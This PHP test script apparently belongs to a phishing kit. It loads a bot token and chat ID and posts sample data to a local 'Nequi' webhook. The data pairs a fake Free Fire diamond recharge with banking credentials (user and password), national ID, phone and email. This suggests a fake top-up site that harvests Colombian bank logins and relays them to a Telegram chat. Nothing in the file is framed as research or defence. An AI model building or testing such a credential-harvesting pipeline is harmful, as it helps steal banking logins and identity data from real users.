<?php
// Script de prueba para el webhook de Nequi
require_once __DIR__ . '/config.php';

echo "=== PRUEBA DEL WEBHOOK NEQUI ===\n\n";

// Verificar configuración usando la misma lógica que el webhook
function loadConfig()
{
    $file = __DIR__ . '/../config.php';
    echo "Buscando config en: $file\n";
    echo "Archivo existe: " . (file_exists($file) ? 'SÍ' : 'NO') . "\n";

    if (!file_exists($file)) return null;

    $config = require $file;
    echo "Contenido del config: " . json_encode($config) . "\n";
    echo "bot_token: '" . ($config['bot_token'] ?? 'NOT_SET') . "'\n";
    echo "chat_id: '" . ($config['chat_id'] ?? 'NOT_SET') . "'\n";

    if (empty($config['bot_token']) || empty($config['chat_id'])) {
        echo "Bot token o chat ID están vacíos\n";
        return null;
    }

    return [
        'token'   => $config['bot_token'],
        'chat_id' => $config['chat_id']
    ];
}

$config = loadConfig();
echo "Bot Token: " . (empty($config['token']) ? 'NO CONFIGURADO' : 'CONFIGURADO') . "\n";
echo "Chat ID: " . (empty($config['chat_id']) ? 'NO CONFIGURADO' : 'CONFIGURADO') . "\n\n";

// Datos de prueba
$testData = [
    'transactionId' => 'TEST_' . time(),
    'bancoldata' => ['usuario' => '3001234567', 'clave' => '3001234567'],
    'tbdatos' => [
        'correo' => 'test@example.com',
        'cel' => '3001234567',
        'val' => '1234567890',
        'per' => 'natural',
        'nom' => 'Usuario de Prueba',
        'telefono' => '3001234567',
        'identificacion' => '1234567890',
        'tipo_persona' => 'natural',
        'banco' => 'nequi'
    ],
    'total' => 5000,
    'freefire' => [
        'diamonds' => 100,
        'bonus' => 10,
        'playerId' => '123456789',
        'playerName' => 'TestPlayer'
    ]
];

echo "Enviando datos de prueba...\n";
echo "Payload: " . json_encode($testData, JSON_PRETTY_PRINT) . "\n\n";

// Simular la petición POST
$ch = curl_init('http://localhost:8000/data-ps/recargas/transaction/nequi-1/1.php');
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST => true,
    CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
    CURLOPT_POSTFIELDS => json_encode($testData)
]);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

echo "Respuesta del servidor (HTTP $httpCode):\n";
echo $response . "\n\n";

if ($httpCode === 200) {
    $result = json_decode($response, true);
    if ($result && $result['ok']) {
        echo "✅ Webhook funcionando correctamente\n";
    } else {
        echo "❌ Error en el webhook\n";
    }
} else {
    echo "❌ Error HTTP en la petición\n";
}
?>